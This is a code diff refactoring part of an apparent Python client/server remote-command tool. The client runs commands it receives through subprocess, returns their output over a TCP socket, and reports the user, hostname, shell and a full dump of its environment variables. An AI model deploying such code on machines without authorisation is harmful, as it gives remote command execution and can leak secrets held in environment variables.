@@ -53,8 +53,8 @@ class StreamSocket(NodeConfig):
         self.Debug = debug
 
     @staticmethod
-    def recv_all(sock: socket.socket, length: int) -> bytearray:
-        """Receive data on TCP socket and check for EOF"""
+    def _recv_all(sock: socket.socket, length: int) -> bytearray:
+        """Protected helper method to get socket data and check for EOF"""
         data = bytearray()
 
         while len(data) < length:
@@ -66,22 +66,22 @@ class StreamSocket(NodeConfig):
 
     def recv_msg(self, sock: socket.socket) -> str:
         """Receive socket data without experiencing packet fragmentation"""
-        raw_len = self.recv_all(sock, 4)  # get size indicator
+        raw_len = self._recv_all(sock, 4)  # get size indicator
 
         if raw_len:
             length = struct.unpack(">I", raw_len)[0]
-            return self.recv_all(sock, length).decode()
+            return self._recv_all(sock, length).decode()
         else:
             return ""
 
-    def receive_cmd(self, sock: socket.socket) -> (str, str):
+    def recv_cmd(self, sock: socket.socket) -> (str, str):
         """Receive data without experiencing packet fragmentation. This method
         is intended to be used by Server to receive client command output"""
-        raw_len = self.recv_all(sock, 4)  # get size indicator
+        raw_len = self._recv_all(sock, 4)  # get size indicator
 
         if raw_len:
             length = struct.unpack(">I", raw_len)[0]
-            data = self.recv_all(sock, length).decode().split("::")
+            data = self._recv_all(sock, length).decode().split("::")
             return data[0], data[1]
         else:
             return "", ""
@@ -90,10 +90,10 @@ class StreamSocket(NodeConfig):
     def send_output(sock: socket.socket, msg: str, out_type: str) -> None:
         """Prefix/send messages with 32-bit unsigned int size prefix. This
         method is intended to be used by Client to send command output"""
-        if out_type in ["stdout", "stderr"]:
+        if out_type in ["output", "error"]:
             msg = "::".join([out_type, msg])
         else:
-            raise ValueError("Expected <out_type> to be in [stdout|stderr]")
+            raise ValueError("Expected <out_type> to be in [output|error]")
 
         message = struct.pack(">I", len(msg)) + msg.encode()
         sock.sendall(message)
@@ -153,7 +153,7 @@ class StreamSocket(NodeConfig):
         """Protected helper method to execute command once input is validated.
         StreamSocket.execute method should be called to properly access this method"""
         if "\\" in command:
-            command.replace("\\", "/")
+            command = command.replace("\\", "/")
 
         stats = subprocess.run(
             args=command,
@@ -168,12 +168,14 @@ class StreamSocket(NodeConfig):
 
         return [command.encode(), stats.stdout, stats.stderr]
 
-    def change_dir(self, command: str) -> (bool, str):
+    def _change_dir(self, command: str) -> (bool, str):
         """Update LastWD property with the new location. Return the path tested
-        and a bool indicating if working directory was successfully changed"""
+        and a bool indicating if working directory was successfully changed.
+        This method is protected and should only be called by socket.execute"""
+        # TODO: add handling for [cd $ENV] commands
+
         if "\\" in command:
             command = command.replace("\\", "/")
-
         cmd_args = command.split()
 
         if len(cmd_args) > 1:
@@ -183,35 +185,36 @@ class StreamSocket(NodeConfig):
 
         if path is not None:
             if path.exists():
-                os.chdir(str(path))
                 self.LastWD = str(path)
-                return [True, str(path)]
+                os.chdir(self.LastWD)
+                return [True, self.LastWD]
             else:
-                return [False, path]
+                return [False, str(path)]
         else:
-            return [False, path]
+            return [True, self.LastWD]
 
     def get_sysinfo(self) -> (str, str):
-        """Retrieve system information of the local machine.
-        Transforms uname_result [NamedTuple] to a string."""
-        hostinfo = "::".join([
-            getpass.getuser(),
-            socket.gethostname(),
-            self.LastWD,
-            utils.OPSYS,
-            self.Shell,
-            str(os.environ.copy())[1: -1]
-        ])
+        """Retrieve system information of the local machine, as well
+        as user/host information. Return a tuple with two strings."""
+        uname = platform.uname()
 
-        output = []
-        uname_str = str(platform.uname())[13:][:-1]
-        uname = uname_str.split(", ", 5)
-
-        for stat in uname:
-            output.append(stat.split("=")[1].replace("'", ""))
-
-        sysinfo = " ".join(output)
-        return hostinfo, sysinfo
+        return [
+            "::".join([
+                getpass.getuser(),
+                socket.gethostname(),
+                self.LastWD,
+                utils.OPSYS,
+                self.Shell,
+                str(os.environ.copy())[1: -1]
+            ]),
+            " ".join([
+                uname.system,
+                uname.node,
+                uname.release,
+                uname.version,
+                uname.machine
+            ])
+        ]
 
     @staticmethod
     def except_handler(exc: Exception) -> None:
